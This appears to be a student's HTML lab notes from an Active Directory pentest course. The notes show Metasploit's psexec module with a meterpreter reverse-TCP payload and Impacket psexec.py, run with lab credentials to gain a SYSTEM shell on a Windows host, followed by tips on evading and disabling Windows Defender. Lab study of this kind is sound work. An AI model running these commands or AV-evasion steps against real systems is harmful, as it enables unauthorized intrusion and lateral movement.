@@ -1,0 +1,332 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title> Gaining Shell Access</title>
+</head><body>Search for Psexec <br/>
+<br/>
+<img height="357" src="console.png" width="550"/><br/>
+<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# msfconsole <br/>
+                         <br/>
+                 ___     ____<br/>
+               ,-&quot;&quot;  `.   &lt; HONK &gt;<br/>
+              ,' _  e )`-._ / ----<br/>
+              / ,' `-._&lt;.===-'<br/>
+             / /<br/>
+             / ;<br/>
+       _     /  ;<br/>
+(`._  _.-&quot;&quot; &quot;&quot;--..__,'  |<br/>
+&lt;_ `-&quot;&quot;           \<br/>
+ &lt;`-             :<br/>
+ (__  &lt;__.         ;<br/>
+  `-.  '-.__.   _.'  /<br/>
+    \   `-.__,-'  _,'<br/>
+    `._  ,  /__,-'<br/>
+      &quot;&quot;._\__,'&lt; &lt;____<br/>
+        | | `----.`.<br/>
+        | |    \ `.<br/>
+        ; |___   \-``<br/>
+        \  --&lt;<br/>
+         `.`.&lt;<br/>
+          `-'<br/>
+<br/>
+<br/>
+<br/>
+   =[ metasploit v6.2.3-dev              ]<br/>
++ -- --=[ 2227 exploits - 1172 auxiliary - 398 post    ]<br/>
++ -- --=[ 864 payloads - 45 encoders - 11 nops      ]<br/>
++ -- --=[ 9 evasion                    ]<br/>
+<br/>
+Metasploit tip: You can upgrade a shell to a Meterpreter <br/>
+session on many platforms using sessions -u <br/>
+&lt;session_id&gt;<br/>
+<br/>
+msf6 &gt; search psexec<br/>
+<br/>
+Matching Modules<br/>
+================<br/>
+<br/>
+ #  Name                     Disclosure Date Rank    Check Description<br/>
+ -  ----                     --------------- ----    ----- -----------<br/>
+ 0  auxiliary/scanner/smb/impacket/dcomexec   2018-03-19    normal   No   DCOM Exec<br/>
+ 1  exploit/windows/smb/ms17_010_psexec     2017-03-14    normal   Yes  MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution<br/>
+ 2  auxiliary/admin/smb/ms17_010_command     2017-03-14    normal   No   MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution<br/>
+ 3  auxiliary/scanner/smb/psexec_loggedin_users          normal   No   Microsoft Windows Authenticated Logged In Users Enumeration<br/>
+ 4  exploit/windows/smb/psexec          1999-01-01    manual   No   Microsoft Windows Authenticated User Code Execution<br/>
+ 5  auxiliary/admin/smb/psexec_ntdsgrab              normal   No   PsExec NTDS.dit And SYSTEM Hive Download Utility<br/>
+ 6  exploit/windows/local/current_user_psexec  1999-01-01    excellent No   PsExec via Current User Token<br/>
+ 7  encoder/x86/service                      manual   No   Register Service<br/>
+ 8  auxiliary/scanner/smb/impacket/wmiexec    2018-03-19    normal   No   WMI Exec<br/>
+ 9  exploit/windows/smb/webexec         2018-10-24    manual   No   WebExec Authenticated User Code Execution<br/>
+ 10 exploit/windows/local/wmi          1999-01-01    excellent No   Windows Management Instrumentation (WMI) Remote Command Execution<br/>
+<br/>
+<br/>
+Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/local/wmi<br/>
+<br/>
+msf6 &gt; <br/>
+<br/>
+<br/>
+<br/>
+<br/>
+sf6 &gt; use 4<br/>
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp<br/>
+msf6 exploit(windows/smb/psexec) &gt; options<br/>
+<br/>
+Module options (exploit/windows/smb/psexec):<br/>
+<br/>
+ Name         Current Setting Required Description<br/>
+ ----         --------------- -------- -----------<br/>
+ RHOSTS                 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br/>
+ RPORT         445       yes    The SMB service port (TCP)<br/>
+ SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing<br/>
+ SERVICE_DISPLAY_NAME          no    The service display name<br/>
+ SERVICE_NAME              no    The service name<br/>
+ SMBDomain       .        no    The Windows domain to use for authentication<br/>
+ SMBPass                no    The password for the specified username<br/>
+ SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share<br/>
+ SMBUser                no    The username to authenticate as<br/>
+<br/>
+<br/>
+Payload options (windows/meterpreter/reverse_tcp):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
+ LHOST   192.168.205.128 yes    The listen address (an interface may be specified)<br/>
+ LPORT   4444       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Automatic<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set rhosts 192.168.205.138</b><br/>
+rhosts =&gt; 192.168.205.138<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set subdomain marvel.local</b><br/>
+subdomain =&gt; marvel.local<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set smbpass Password1</b><br/>
+smbpass =&gt; Password1<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set smbuser fcastle</b><br/>
+smbuser =&gt; fcastle<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>options</b><br/>
+<br/>
+Module options (exploit/windows/smb/psexec):<br/>
+<br/>
+ Name         Current Setting Required Description<br/>
+ ----         --------------- -------- -----------<br/>
+ RHOSTS        192.168.205.138 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br/>
+ RPORT         445       yes    The SMB service port (TCP)<br/>
+ SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing<br/>
+ SERVICE_DISPLAY_NAME          no    The service display name<br/>
+ SERVICE_NAME              no    The service name<br/>
+ SMBDomain       .        no    The Windows domain to use for authentication<br/>
+ SMBPass        Password1    no    The password for the specified username<br/>
+ SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share<br/>
+ SMBUser        fcastle     no    The username to authenticate as<br/>
+<br/>
+<br/>
+Payload options (windows/meterpreter/reverse_tcp):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
+ LHOST   192.168.205.128 yes    The listen address (an interface may be specified)<br/>
+ LPORT   4444       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Automatic<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set smbdomain marvel.local</b><br/>
+smbdomain =&gt; marvel.local<br/>
+msf6 exploit(windows/smb/psexec) &gt; options<br/>
+<br/>
+Module options (exploit/windows/smb/psexec):<br/>
+<br/>
+ Name         Current Setting Required Description<br/>
+ ----         --------------- -------- -----------<br/>
+ RHOSTS        192.168.205.138 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br/>
+ RPORT         445       yes    The SMB service port (TCP)<br/>
+ SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing<br/>
+ SERVICE_DISPLAY_NAME          no    The service display name<br/>
+ SERVICE_NAME              no    The service name<br/>
+ SMBDomain       marvel.local   no    The Windows domain to use for authentication<br/>
+ SMBPass        Password1    no    The password for the specified username<br/>
+ SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share<br/>
+ SMBUser        fcastle     no    The username to authenticate as<br/>
+<br/>
+<br/>
+Payload options (windows/meterpreter/reverse_tcp):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
+ LHOST   192.168.205.128 yes    The listen address (an interface may be specified)<br/>
+ LPORT   4444       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Automatic<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set payload windows/x64/me</b><br/>
+set payload windows/x64/messagebox           set payload windows/x64/meterpreter/bind_tcp_rc4    set payload windows/x64/meterpreter/reverse_tcp<br/>
+set payload windows/x64/meterpreter/bind_ipv6_tcp    set payload windows/x64/meterpreter/bind_tcp_uuid    set payload windows/x64/meterpreter/reverse_tcp_rc4<br/>
+set payload windows/x64/meterpreter/bind_ipv6_tcp_uuid set payload windows/x64/meterpreter/reverse_http    set payload windows/x64/meterpreter/reverse_tcp_uuid<br/>
+set payload windows/x64/meterpreter/bind_named_pipe   set payload windows/x64/meterpreter/reverse_https    set payload windows/x64/meterpreter/reverse_winhttp<br/>
+set payload windows/x64/meterpreter/bind_tcp      set payload windows/x64/meterpreter/reverse_named_pipe set payload windows/x64/meterpreter/reverse_winhttps<br/>
+msf6 exploit(windows/smb/psexec) &gt; set payload windows/x64/me<br/>
+set payload windows/x64/messagebox           set payload windows/x64/meterpreter/bind_tcp_rc4    set payload windows/x64/meterpreter/reverse_tcp<br/>
+set payload windows/x64/meterpreter/bind_ipv6_tcp    set payload windows/x64/meterpreter/bind_tcp_uuid    set payload windows/x64/meterpreter/reverse_tcp_rc4<br/>
+set payload windows/x64/meterpreter/bind_ipv6_tcp_uuid set payload windows/x64/meterpreter/reverse_http    set payload windows/x64/meterpreter/reverse_tcp_uuid<br/>
+set payload windows/x64/meterpreter/bind_named_pipe   set payload windows/x64/meterpreter/reverse_https    set payload windows/x64/meterpreter/reverse_winhttp<br/>
+set payload windows/x64/meterpreter/bind_tcp      set payload windows/x64/meterpreter/reverse_named_pipe set payload windows/x64/meterpreter/reverse_winhttps<br/>
+msf6 exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcp<br/>
+payload =&gt; windows/x64/meterpreter/reverse_tcp<br/>
+msf6 exploit(windows/smb/psexec) &gt; options<br/>
+<br/>
+Module options (exploit/windows/smb/psexec):<br/>
+<br/>
+ Name         Current Setting Required Description<br/>
+ ----         --------------- -------- -----------<br/>
+ RHOSTS        192.168.205.138 yes    The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br/>
+ RPORT         445       yes    The SMB service port (TCP)<br/>
+ SERVICE_DESCRIPTION          no    Service description to to be used on target for pretty listing<br/>
+ SERVICE_DISPLAY_NAME          no    The service display name<br/>
+ SERVICE_NAME              no    The service name<br/>
+ SMBDomain       marvel.local   no    The Windows domain to use for authentication<br/>
+ SMBPass        Password1    no    The password for the specified username<br/>
+ SMBSHARE                no    The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share<br/>
+ SMBUser        fcastle     no    The username to authenticate as<br/>
+<br/>
+<br/>
+Payload options (windows/x64/meterpreter/reverse_tcp):<br/>
+<br/>
+ Name   Current Setting Required Description<br/>
+ ----   --------------- -------- -----------<br/>
+ EXITFUNC thread      yes    Exit technique (Accepted: '', seh, thread, process, none)<br/>
+ LHOST   192.168.205.128 yes    The listen address (an interface may be specified)<br/>
+ LPORT   4444       yes    The listen port<br/>
+<br/>
+<br/>
+Exploit target:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Automatic<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set lhost eth0</b><br/>
+lhost =&gt; eth0<br/>
+msf6 exploit(windows/smb/psexec) &gt; run<br/>
+<br/>
+[*] Started reverse TCP handler on 192.168.205.128:4444 <br/>
+[*] 192.168.205.138:445 - Connecting to the server...<br/>
+[*] 192.168.205.138:445 - Authenticating to 192.168.205.138:445|marvel.local as user 'fcastle'...<br/>
+[*] 192.168.205.138:445 - Selecting PowerShell target<br/>
+[*] 192.168.205.138:445 - Executing the payload...<br/>
+[+] 192.168.205.138:445 - Service start timed out, OK if running a command or non-service executable...<br/>
+[*] Exploit completed, but no session was created.<br/>
+msf6 exploit(windows/smb/psexec) &gt; run<br/>
+<br/>
+[*] Started reverse TCP handler on 192.168.205.128:4444 <br/>
+[*] 192.168.205.138:445 - Connecting to the server...<br/>
+[*] 192.168.205.138:445 - Authenticating to 192.168.205.138:445|marvel.local as user 'fcastle'...<br/>
+[*] 192.168.205.138:445 - Selecting PowerShell target<br/>
+[*] 192.168.205.138:445 - Executing the payload...<br/>
+[-] 192.168.205.138:445 - Service failed to start - ACCESS_DENIED<br/>
+[*] Exploit completed, but no session was created.<br/>
+msf6 exploit(windows/smb/psexec) &gt; show targets<br/>
+<br/>
+Exploit targets:<br/>
+<br/>
+ Id Name<br/>
+ -- ----<br/>
+ 0  Automatic<br/>
+ 1  PowerShell<br/>
+ 2  Native upload<br/>
+ 3  MOF upload<br/>
+ 4  Command<br/>
+<br/>
+<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>set target 2</b><br/>
+target =&gt; 2<br/>
+msf6 exploit(windows/smb/psexec) &gt; <b>run</b><br/>
+<br/>
+[*] Started reverse TCP handler on 192.168.205.128:4444 <br/>
+[*] 192.168.205.138:445 - Connecting to the server...<br/>
+[*] 192.168.205.138:445 - Authenticating to 192.168.205.138:445|marvel.local as user 'fcastle'...<br/>
+[!] 192.168.205.138:445 - peer_native_os is only available with SMB1 (current version: SMB3)<br/>
+[*] 192.168.205.138:445 - Uploading payload... FeVeCBCs.exe<br/>
+[*] 192.168.205.138:445 - Created \FeVeCBCs.exe...<br/>
+[-] 192.168.205.138:445 - Service failed to start, ERROR_CODE: 225<br/>
+[*] 192.168.205.138:445 - Deleting \FeVeCBCs.exe...<br/>
+[-] 192.168.205.138:445 - Exploit failed: RubySMB::Error::UnexpectedStatusCode The server responded with an unexpected status code: STATUS_VIRUS_INFECTED<br/>
+[*] Exploit completed, but no session was created.<br/>
+msf6 exploit(windows/smb/psexec) &gt; <br/>
+<br/>
+<span style="background-color: #ff0000">We got a Virus Detected in when we are attacking in fcastle</span><br/>
+<br/>
+My Meterpeter as well as psexec.py both got detected by Windows Defender (i.e. Mentor was able to bypass Windows Defender using psexec.py)<br/>
+<br/>
+<br/>
+<img height="373" src="screenshot 2023-03-07 135807.png" width="650"/><br/>
+<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# psexec.py marvel.local/fcastle:Password1@192.168.205.138<br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+[*] Requesting shares on 192.168.205.138.....<br/>
+[*] Found writable share ADMIN$<br/>
+[*] Uploading file eOwIwzRs.exe<br/>
+[*] Opening SVCManager on 192.168.205.138.....<br/>
+[*] Creating service fmIy on 192.168.205.138.....<br/>
+[*] Starting service fmIy.....<br/>
+[!] Press help for extra shell commands<br/>
+Microsoft Windows [Version 10.0.19045.2006]<br/>
+(c) Microsoft Corporation. All rights reserved.<br/>
+<br/>
+C:\Windows\system32&gt;<br/>
+<br/>
+Failed Attempt By Me : <br/>
+<br/>
+<img height="323" src="screenshot 2023-03-07 135906.png" width="650"/><br/>
+<br/>
+<img height="205" src="screenshot 2023-03-07 140056.png" width="650"/><br/>
+<br/>
+It worked with Peter Parker ^_^<br/>
+<br/>
+<img height="309" src="screenshot 2023-03-07 141725.png" width="600"/><br/>
+<br/>
+Mentor has provided us 4 options so don't give at the first tool<br/>
+Psexec is one of the more noisy when it comes to antivirus.<br/>
+<br/>
+<b>Pro Tip:</b><br/>
+Make Sure you get in quietly first go in navigate around try to find the antivirus being used <br/>
+And then try to use something as psexec or even another method in Metasploit to get around.<br/>
+<br/>
+<b><span style="background-color: #ffa300">Try this first:</span></b><br/>
+SMBexec<br/>
+WMIexec <br/>
+<br/>
+and see if they work and we get a shell and if we can they are just Half shell (i.e. not fully interactive and not good enough)<br/>
+to navigate around the C drive <br/>
+<br/>
+What we can do ?_?<br/>
+We can navigate around and see what kind of antivirus is running and then once we figure out and see that we can disable that<br/>
+antivirus so that we can run something more robust like Windows meterpreter<br/>
+<br/>
+Disable the Windows Defender in Frank Castle if it is re-enabled<br/>
+<br/>
+</body></html>
